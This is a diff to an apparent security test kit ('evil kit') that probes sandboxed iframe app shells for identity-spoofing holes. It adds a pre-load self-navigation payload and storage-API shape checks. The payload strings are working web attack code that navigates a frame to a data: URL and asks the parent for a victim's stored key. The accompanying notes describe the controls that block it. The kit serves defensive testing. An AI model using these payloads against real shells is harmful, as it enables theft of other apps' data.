@@ -17,6 +17,11 @@ window.__EVIL_KIT__ = [
     note: 'Any frame can navigate ITSELF — no sandbox token and no CSP fetch directive restricts it. In a Window-keyed shell the reply arrives carrying the verified napplet\'s grants: unverified bytes reading verified data. The injected meta CSP does not apply to the navigated document.',
     data: 'location.replace(\'data:text/html,<script>window.parent.postMessage({type:"storage.get",id:"repro",key:"victim-key"}, "*")<\\/script>\');',
   },
+  {
+    label: 'pre-load self-navigation (replacement before the first load — napplet/evil#5)',
+    note: 'Put this as the napplet\'s FIRST inline script: it self-navigates to data:/blob:/https: before the frame ever fires a first load event. A shell whose replacement-watch keys on a second load or a second napplet.hello has no baseline — there was never a first load of the verified document to diff against, so the replacement is simply the first thing the shell sees. The target scheme is governed only by the EMBEDDING page\'s frame navigation policy, not by the napplet\'s own CSP. Two controls hold: an embedding-page frame-src \'none\' (the srcdoc napplet still loads; this jump is blocked — harness host frame-src knob), and binding identity to the handed-over port while treating any post-handoff window-level NAP as replacement evidence (harness identity binding: port), whatever the timing.',
+    data: 'location.replace(\'data:text/html,<script>window.parent.postMessage({type:"storage.get",id:"preload",key:"victim-key"}, "*")<\\/script>\'); /* runs during initial parse — before this document\'s load event */',
+  },
 ];
 
 /* ---------- stage-2: the unverified replacement document ---------- */
@@ -175,6 +180,16 @@ function resolveTarget() {
   return { kind: 'network', url: u, note: 'target: ' + u.origin + u.pathname + ' (from run parameter ' + TARGET_PARAM + ')' };
 }
 
+// NAP-STORAGE (napplet/naps#3) names the injected methods getItem/setItem/
+// removeItem/keys (getItem → null on a miss). A shell exposing only the
+// pre-spec get/set/remove gets an explicit na naming that shape instead of a
+// TypeError mid-probe; the wire (storage.get/.set/.remove/.keys) is unchanged.
+function preSpecStorage(st) {
+  if (typeof st.getItem === 'function') return null;
+  const legacy = ['get', 'set', 'remove'].filter((k) => typeof st[k] === 'function');
+  return 'storage domain is not NAP-STORAGE shaped (no getItem' + (legacy.length ? '; pre-spec ' + legacy.join('/') + ' only' : '') + ') — probe not run';
+}
+
 async function detonate(mode) {
   // resolve the target BEFORE anything else: a rejected value must not
   // navigate at all — not even to the scheme-local fallback
@@ -185,9 +200,9 @@ async function detonate(mode) {
   // data this napplet was LEGITIMATELY given (through the injected domain)
   let seed = null;
   const st = window.napplet && window.napplet.storage;
-  if (st) {
+  if (st && !preSpecStorage(st)) {
     try {
-      const v = await withTimeout(st.get('__evil09_victim__'), 2000);
+      const v = await withTimeout(st.getItem('__evil09_victim__'), 2000);
       if (v && v !== 'timeout' && !v.__rejected) seed = String(v);
     } catch (_) { /* no seed readable */ }
   }
@@ -253,6 +268,8 @@ const ATTACKS = [
     async demo() {
       const st = window.napplet && window.napplet.storage;
       if (!st) return na('no injected NAP domain — no transport to observe');
+      const gap = preSpecStorage(st);
+      if (gap) return na(gap);
       // passive transport sniff: ride a NORMAL storage roundtrip through the
       // injected namespace and watch whether the reply envelope arrives at
       // this window (pre-#14 window-level postMessage) or over a dedicated
@@ -269,7 +286,7 @@ const ATTACKS = [
         };
         window.addEventListener('message', on);
         let gotValue = null;
-        Promise.resolve(st.get('__evil09_victim__')).then(
+        Promise.resolve(st.getItem('__evil09_victim__')).then(
           (v) => { gotValue = v; setTimeout(() => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve(null); } }, 80); },
           () => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve(null); } }
         );
@@ -283,9 +300,9 @@ const ATTACKS = [
     async evil() {
       const out = {};
       const st = window.napplet && window.napplet.storage;
-      if (st) {
+      if (st && !preSpecStorage(st)) {
         try {
-          const v = await withTimeout(st.get('__evil09_victim__'), 2000);
+          const v = await withTimeout(st.getItem('__evil09_victim__'), 2000);
           if (v && v !== 'timeout' && !v.__rejected) out.victimSeed = String(v);
         } catch (e) { out.getError = errMsg(e); }
       }
